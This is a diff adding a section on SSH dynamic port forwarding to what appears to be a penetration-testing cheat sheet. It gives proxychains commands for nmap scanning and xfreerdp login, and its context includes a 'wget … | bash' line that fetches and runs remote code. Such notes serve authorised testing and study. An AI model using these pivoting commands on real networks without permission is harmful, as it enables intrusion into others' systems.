@@ -541,5 +541,17 @@ wget -q0- <Target File URL> | bash
   ssh -L <LPORT>:localhost:<RPORT> <LPORT>:localhost:<RPORT> <user>@<IP>
   ```
 #### Dynamic Port Forward with SSH and Proxychains
+  1. SSH to the Target
+  ```sh
+  ssh -D 9050 <user>@<IP>
+  ```
+  2. Scan the Target network with nmap and proxychains
+  ```sh
+  proxychains nmap -A Pn -sT <IP>
+  ```
+  3. If there is RDP Access we can use
+  ```sh
+  proxychains xfreerdp /v:<IP> /u:<user> /p:<pass>
+  ```
   
   ## Testing the Top 10 Web Application Vulnerabilities
